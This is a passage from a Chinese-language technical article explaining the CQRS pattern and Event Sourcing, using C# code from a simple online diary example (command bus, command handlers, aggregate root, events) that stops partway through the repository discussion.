<h1 id="CQRS-与-Event-Sourcing-的关系"><a href="#CQRS-与-Event-Sourcing-的关系" class="headerlink" title="CQRS 与 Event Sourcing 的关系"></a>CQRS 与 Event Sourcing 的关系</h1><p>&emsp;&emsp;在 CQRS 中，查询方面，直接通过方法查询数据库，然后通过 DTO 将数据返回。在操作（Command）方面，是通过发送 Command 实现，由 CommandBus 处理特定的 Command，然后由 Command 将特定的 Event 发布到 EventBus 上，然后 EventBus 使用特定的 Handler 来处理事件，执行一些诸如，修改，删除，更新等操作。这里，所有与 Command 相关的操作都通过 Event 实现。这样我们可以通过记录 Event 来记录系统的运行历史记录，并且能够方便的回滚到某一历史状态。<a href="http://msdn.microsoft.com/en-us/library/dn589792.aspx" target="_blank" rel="noopener">Event Sourcing</a> 就是用来进行存储和管理事件的。这里不展开介绍。</p>
<h1 id="CQRS-的简单实现"><a href="#CQRS-的简单实现" class="headerlink" title="CQRS 的简单实现"></a>CQRS 的简单实现</h1><p>&emsp;&emsp;CQRS 模式在思想上比较简单，但是实现上还是有些复杂。它涉及到 DDD，以及 Event Sourcing，这里使用 codeproject 上的 <a href="http://www.codeproject.com/Articles/555855/Introduction-to-CQRS" target="_blank" rel="noopener">Introduction to CQRS</a> 这篇文章的例子来说明 CQRS 模式。这个例子是一个简单的在线记日志（Diary）系统，实现了日志的增删改查功能。整体结构如下：</p>
<figure class="image-box">
                <img src="261851438603372.jpg" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;上图很清晰的说明了 CQRS 在读写方面的分离，在读方面，通过 QueryFacade 到数据库里去读取数据，这个库有可能是 ReportingDB。在写方面，比较复杂，操作通过 Command 发送到 CommandBus 上，然后特定的 CommandHandler 处理请求，产生对应的 Event，将 Eevnt 持久化后，通过 EventBus 特定的 EevntHandler 对数据库进行修改等操作。<br>&emsp;&emsp;例子代码可以到 <a href="http://www.codeproject.com/Articles/555855/Introduction-to-CQRS" target="_blank" rel="noopener">codeproject</a> 上下载，整体结构如下：</p>
<figure class="image-box">
                <img src="261851446735785.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;由三个项目构成，Diary.CQRS 包含了所有的 Domain 和消息对象。Configuration 通过使用一个名为 StructMap 的 IOC 来初始化一些变量方便 Web 调用，Web 是一个简单的 MVC3 项目，在 Controller 中有与 CQRS 交互的代码。<br>&emsp;&emsp;下面分别看 Query 和 Command 方面的实现：  </p>
<h2 id="Query-方向的实现"><a href="#Query-方向的实现" class="headerlink" title="Query 方向的实现"></a>Query 方向的实现</h2><p>&emsp;&emsp;查询方面很简单，日志列表和明细获取就是简单的查询。下面先看列表查询部分的代码。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ActionResult <span class="title">Index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ViewBag.Model = ServiceLocator.ReportDatabase.GetItems();</span><br><span class="line">    <span class="keyword">return</span> View();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> ActionResult <span class="title">Edit</span>(<span class="params">Guid id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> item = ServiceLocator.ReportDatabase.GetById(id);</span><br><span class="line">    <span class="keyword">var</span> model = <span class="keyword">new</span> DiaryItemDto()</span><br><span class="line">    &#123;</span><br><span class="line">        Description = item.Description,</span><br><span class="line">        From = item.From,</span><br><span class="line">        Id = item.Id,</span><br><span class="line">        Title = item.Title,</span><br><span class="line">        To = item.To,</span><br><span class="line">        Version = item.Version</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> View(model);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;ReportDatabase 的 GetItems 和 GetById(id) 方法就是简单的查询，从命名可以看出他是 ReportDatabase。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ReportDatabase</span> : <span class="title">IReportDatabase</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">static</span> List&lt;DiaryItemDto&gt; items = <span class="keyword">new</span> List&lt;DiaryItemDto&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> DiaryItemDto <span class="title">GetById</span>(<span class="params">Guid id</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> items.Where(a =&gt; a.Id == id).FirstOrDefault();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Add</span>(<span class="params">DiaryItemDto item</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        items.Add(item);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Delete</span>(<span class="params">Guid id</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        items.RemoveAll(i =&gt; i.Id == id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;DiaryItemDto&gt; <span class="title">GetItems</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> items;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;ReportDataBase 只是在内部维护了一个 List 的 DiaryItemDto 列表。在使用的时候，是通过 IRepositoryDatabase 对其进行操作的，这样便于 mock 代码。<br>&emsp;&emsp;Query 方面的代码很简单。在实际的应用中，这一块就是直接对 DB 进行查询，然后通过 DTO 对象返回，这个 DB 可能是应对特定场景的报表数据库，这样可以提升查询性能。<br>&emsp;&emsp;下面来看 Command 方向的实现：  </p>
<h2 id="Command-方向的实现"><a href="#Command-方向的实现" class="headerlink" title="Command 方向的实现"></a>Command 方向的实现</h2><p>&emsp;&emsp;Command 的实现比较复杂，下面以简单的创建一个新的日志来说明。<br>&emsp;&emsp;在 MVC 的 Control 中，可以看到 Add 的 Controller 中只调用了一句话：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">HttpPost</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> ActionResult <span class="title">Add</span>(<span class="params">DiaryItemDto item</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ServiceLocator.CommandBus.Send(<span class="keyword">new</span> CreateItemCommand(Guid.NewGuid(), item.Title, item.Description, <span class="number">-1</span>, item.From, item.To));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> RedirectToAction(<span class="string">"Index"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;首先声明了一个 CreateItemCommand，这个 Command 只是保存了一些必要的信息。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">CreateItemCommand</span>:<span class="title">Command</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Title &#123; <span class="keyword">get</span>; <span class="keyword">internal</span> <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Description &#123; <span class="keyword">get</span>;<span class="keyword">internal</span> <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> DateTime From &#123; <span class="keyword">get</span>; <span class="keyword">internal</span> <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> DateTime To &#123; <span class="keyword">get</span>; <span class="keyword">internal</span> <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CreateItemCommand</span>(<span class="params">Guid aggregateId, <span class="keyword">string</span> title, </span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">string</span> description,<span class="keyword">int</span> version,DateTime <span class="keyword">from</span>, DateTime to</span>)</span></span><br><span class="line"><span class="function">        : <span class="title">base</span>(<span class="params">aggregateId,version</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Title = title;</span><br><span class="line">        Description = description;</span><br><span class="line">        From = <span class="keyword">from</span>;</span><br><span class="line">        To = to;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后将 Command 发送到了 CommandBus 上，其实就是让 CommandBus 来选择合适的 CommandHandler 来处理。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">CommandBus</span>:<span class="title">ICommandBus</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> ICommandHandlerFactory _commandHandlerFactory;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CommandBus</span>(<span class="params">ICommandHandlerFactory commandHandlerFactory</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _commandHandlerFactory = commandHandlerFactory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> Send&lt;T&gt;(T command) <span class="keyword">where</span> T : Command</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> handler = _commandHandlerFactory.GetHandler&lt;T&gt;();</span><br><span class="line">        <span class="keyword">if</span> (handler != <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            handler.Execute(command);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnregisteredDomainCommandException(<span class="string">"no handler registered"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这个里面需要值得注意的是 CommandHandlerFactory 这个类型的 GetHandler 方法，他接受一个类型为 T 的泛型，这里就是我们之前传入的 CreateItemCommand。来看他的 GetHandler 方法。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">StructureMapCommandHandlerFactory</span> : <span class="title">ICommandHandlerFactory</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> ICommandHandler&lt;T&gt; GetHandler&lt;T&gt;() <span class="keyword">where</span> T : Command</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> handlers = GetHandlerTypes&lt;T&gt;().ToList();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> cmdHandler = handlers.Select(handler =&gt; </span><br><span class="line">            (ICommandHandler&lt;T&gt;)ObjectFactory.GetInstance(handler)).FirstOrDefault();</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> cmdHandler;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">private</span> IEnumerable&lt;Type&gt; GetHandlerTypes&lt;T&gt;() <span class="keyword">where</span> T : Command</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> handlers = <span class="keyword">typeof</span>(ICommandHandler&lt;&gt;).Assembly.GetExportedTypes()</span><br><span class="line">            .Where(x =&gt; x.GetInterfaces()</span><br><span class="line">                .Any(a =&gt; a.IsGenericType &amp;&amp; a.GetGenericTypeDefinition() == <span class="keyword">typeof</span>(ICommandHandler&lt;&gt;) ))</span><br><span class="line">                .Where(h=&gt;h.GetInterfaces()</span><br><span class="line">                    .Any(ii=&gt;ii.GetGenericArguments()</span><br><span class="line">                        .Any(aa=&gt;aa==<span class="keyword">typeof</span>(T)))).ToList();</span><br><span class="line"></span><br><span class="line">           </span><br><span class="line">        <span class="keyword">return</span> handlers;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这里可以看到，他首先查找当前的程序集中（ICommandHandler）所在的程序集中的所有的实现了 ICommandHandler 的接口的类型，然后在所有的类型找查找实现了该泛型接口并且泛型的类型参数类型为 T 类型的所有类型。以上面的代码为例，就是要找出实现了 ICommandHandler&lt;CreateItemCommand&gt; 接口的类型。可以看到就是 CreateItemCommandHandler 类型。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public class CreateItemCommandHandler : ICommandHandler&lt;CreateItemCommand&gt;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> IRepository&lt;DiaryItem&gt; _repository;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CreateItemCommandHandler</span>(<span class="params">IRepository&lt;DiaryItem&gt; repository</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _repository = repository;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Execute</span>(<span class="params">CreateItemCommand command</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (command == <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentNullException(<span class="string">"command"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (_repository == <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidOperationException(<span class="string">"Repository is not initialized."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> aggregate = <span class="keyword">new</span> DiaryItem(command.Id, command.Title, command.Description, command.From, command.To);</span><br><span class="line">        aggregate.Version = <span class="number">-1</span>;</span><br><span class="line">        _repository.Save(aggregate, aggregate.Version);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;找到之后然后使用 IOC 实例化了该对象返回。<br>&emsp;&emsp;现在 CommandBus 中，找到了处理特定 Command 的 Handler。然后执行该类型的 Execute 方法。<br>&emsp;&emsp;可以看到在该类型中实例化了一个名为 aggregate 的 DiaryItem 对象。这个和我们之前查询所用到的 DiaryItemDto 有所不同，这个一个领域对象，里面包含了一系列事件。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DiaryItem</span> : <span class="title">AggregateRoot</span>, </span><br><span class="line">    IHandle&lt;ItemCreatedEvent&gt;,</span><br><span class="line">    IHandle&lt;ItemRenamedEvent&gt;,</span><br><span class="line">    IHandle&lt;ItemFromChangedEvent&gt;, </span><br><span class="line">    IHandle&lt;ItemToChangedEvent&gt;,</span><br><span class="line">    IHandle&lt;ItemDescriptionChangedEvent&gt;,</span><br><span class="line">    IOriginator</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Title &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> DateTime From &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> DateTime To &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Description &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DiaryItem</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DiaryItem</span>(<span class="params">Guid id,<span class="keyword">string</span> title, <span class="keyword">string</span> description,  DateTime <span class="keyword">from</span>, DateTime to</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        ApplyChange(<span class="keyword">new</span> ItemCreatedEvent(id, title,description, <span class="keyword">from</span>, to));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ChangeTitle</span>(<span class="params"><span class="keyword">string</span> title</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        ApplyChange(<span class="keyword">new</span> ItemRenamedEvent(Id, title));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Handle</span>(<span class="params">ItemCreatedEvent e</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Title = e.Title;</span><br><span class="line">        From = e.From;</span><br><span class="line">        To = e.To;</span><br><span class="line">        Id = e.AggregateId;</span><br><span class="line">        Description = e.Description;</span><br><span class="line">        Version = e.Version;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Handle</span>(<span class="params">ItemRenamedEvent e</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Title = e.Title;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;ItemCreatedEvent 事件的定义如下，其实就是用来存储传输过程中需要用到的数据。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ItemCreatedEvent</span>:<span class="title">Event</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Title &#123; <span class="keyword">get</span>; <span class="keyword">internal</span> <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> DateTime From &#123; <span class="keyword">get</span>; <span class="keyword">internal</span> <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> DateTime To &#123; <span class="keyword">get</span>; <span class="keyword">internal</span> <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Description &#123; <span class="keyword">get</span>;<span class="keyword">internal</span> <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ItemCreatedEvent</span>(<span class="params">Guid aggregateId, <span class="keyword">string</span> title ,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">string</span> description, DateTime <span class="keyword">from</span>, DateTime to</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        AggregateId = aggregateId;</span><br><span class="line">        Title = title;</span><br><span class="line">        From = <span class="keyword">from</span>;</span><br><span class="line">        To = to;</span><br><span class="line">        Description = description;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;可以看到在 Domain 对象中，除了定义基本的字段外，还定义了一些相应的事件，比如在构造函数中，实际上是发起了一个名为 ItemCreateEvent 的事件，同时还定义了处理时间的逻辑，这些逻辑都放在名为 Handle 的接口方法发，例如 ItemCerateEvent 的处理方法为 Handle(ItemCreateEvent) 方法。<br>&emsp;&emsp;ApplyChange 方法在 AggregateRoot 对象中，他是聚合根，这是 DDD 中的概念。通过这个根可以串起所有对象。 该类实现了 IEventProvider 接口，他保存了所有在 _changes 中的所有没有提交的变更，其中的 ApplyChange 的用来为特定的 Event 查找 Eventhandler 的方法：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title">AggregateRoot</span> : <span class="title">IEventProvider</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> List&lt;Event&gt; _changes;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Guid Id &#123; <span class="keyword">get</span>; <span class="keyword">internal</span> <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> Version &#123; <span class="keyword">get</span>; <span class="keyword">internal</span> <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> EventVersion &#123; <span class="keyword">get</span>; <span class="keyword">protected</span> <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">AggregateRoot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _changes = <span class="keyword">new</span> List&lt;Event&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IEnumerable&lt;Event&gt; <span class="title">GetUncommittedChanges</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> _changes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">MarkChangesAsCommitted</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _changes.Clear();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">LoadsFromHistory</span>(<span class="params">IEnumerable&lt;Event&gt; history</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">var</span> e <span class="keyword">in</span> history) ApplyChange(e, <span class="literal">false</span>);</span><br><span class="line">        Version = history.Last().Version;</span><br><span class="line">        EventVersion = Version;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">ApplyChange</span>(<span class="params">Event @<span class="keyword">event</span></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        ApplyChange(@<span class="keyword">event</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ApplyChange</span>(<span class="params">Event @<span class="keyword">event</span>, <span class="keyword">bool</span> isNew</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">dynamic</span> d = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">        d.Handle(Converter.ChangeTo(@<span class="keyword">event</span>, @<span class="keyword">event</span>.GetType()));</span><br><span class="line">        <span class="keyword">if</span> (isNew)</span><br><span class="line">        &#123;</span><br><span class="line">            _changes.Add(@<span class="keyword">event</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;在 ApplyChange 的实现中，this 其实就是对应的实现了 AggregateRoot 的 DiaryItem 的 Domain 对象，调用的 Handle 方法就是我们之前在 DiaryItem 中定义的行为。然后将该 event 保存在内部的未提交的事件列表中。相关的信息及事件都保存在了定义的 aggregate 对象中并返回。<br>&emsp;&emsp;然后 Command 继续执行，然后调用了 _repository.Save(aggregate, aggregate.Version); 这个方法。先看这个 Repository 对象。</p>
